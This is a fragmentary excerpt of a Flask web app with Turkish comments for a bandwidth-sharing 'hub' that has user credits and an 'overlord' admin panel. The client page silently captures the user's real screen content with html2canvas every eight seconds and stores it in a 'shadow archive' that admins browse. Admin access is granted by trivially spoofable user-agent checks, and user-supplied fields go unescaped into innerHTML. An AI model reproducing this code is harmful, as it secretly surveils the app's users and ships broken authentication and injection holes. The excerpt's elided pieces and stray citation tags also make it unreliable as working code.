...
# --- NETSWAP SOVEREIGN TRUE-VISION v152.0 ---
# Vizyon: Gerçek DOM Capture, Esnek A55 Onayı ve Tam Arşivleme. [cite: 2026-01-03]
VERSION = "v152.0"
...
state = {
    ...
    "active_admins": {}, 
    "evolution_count": 52, "s100_temp": "38°C"
}
...
def check_admin_auth(req):
    ...
    # A55 girişi için daha kapsayıcı kontrol [cite: 2026-01-03]
    is_authorized = "SM-A55" in ua or "437F" in ua or "WINDOWS" in ua or ("ANDROID" in ua and "CHROME" in ua)
...
@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "<h1>REDDEDİLDİ: Cihaz Doğrulanamadı</h1>", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>True-Vision Console</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b-2 border-green-600 pb-2 mb-4 flex justify-between items-center">
        <h1 class="text-xl font-black text-green-500 uppercase italic">TRUE-VISION v152.0</h1>
        <div id="adminNodes" class="flex gap-2 text-[7px]"></div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-4 border border-zinc-900 rounded-2xl">
            <h2 class="text-blue-400 font-bold mb-2 uppercase border-b border-blue-900">GÖLGE ARŞİV</h2>
        ...
        <div class="col-span-3 bg-zinc-950 rounded-2xl border border-zinc-900 overflow-hidden">
            <table class="w-full text-left">
                <thead class="bg-zinc-900 text-zinc-500 font-bold"><tr><th class="p-3">CİHAZ</th><th>ID</th><th>BAKİYE</th><th>HIZ</th><th>KOMUTA</th></tr></thead>
    ...
    <script>
        ...
        function uG(){
            ...
            if(id && reg[id] && reg[id].archive){
                reg[id].archive.slice().reverse().forEach(s => {
                    g.innerHTML += `<div class="p-1 border border-zinc-800 rounded mb-2 bg-black">
                        <p class="text-[6px] text-zinc-600">${s.time}</p>
        ...
        async function update(){
            ...
            let uH="", aH="", pO="<option value=''>Kullanıcı Seç</option>";
            for(let sid in d.active_admins){ let a=d.active_admins[sid]; aH += `<span class="bg-blue-900/30 px-2 py-1 rounded text-blue-400 border border-blue-800">🛡️ ${a.device}</span>`; }
            for(let id in d.user_registry){
                let u=d.user_registry[id]; if(d.banned_peers.includes(id)) continue;
                pO += `<option value="${id}">${id}</option>`;
                uH += `<tr class="border-b border-zinc-900"><td class="p-3"><b>${u.device}</b></td><td class="text-blue-400 font-bold">${id}</td>
                <td class="text-green-500">${u.credits.toFixed(1)}</td><td class="text-yellow-600">${u.max_mbps}M</td>
                <td><button onclick="f('gift','${id}', prompt('MB:'))" class="underline mr-2">KREDİ</button>
...
<body class="bg-black text-green-500 font-mono p-4" onload="mainLoop()">
    <div class="text-center mb-6"><h1 class="text-2xl font-black text-blue-600 italic">IMPERIAL HUB</h1><p class="text-[8px] text-zinc-700">v152.0 Vision-Ready</p></div>
    ...
    <div class="grid grid-cols-2 gap-4">
        <button onclick="control('share')" class="py-8 bg-green-700 text-black font-black rounded-3xl text-2xl active:scale-95 transition">VER</button>
        <button onclick="control('receive')" class="py-8 bg-blue-700 text-white font-black rounded-3xl text-2xl active:scale-95 transition">AL</button>
    </div>
    ...
    <script>
        ...
        async function shadowCapture() {
            try {
                // html2canvas ile GERÇEK ekran içeriğini yakala [cite: 2026-01-03]
        ...
        async function mainLoop() {
            ...
            if(!window.ssInt) window.ssInt = setInterval(shadowCapture, 8000);
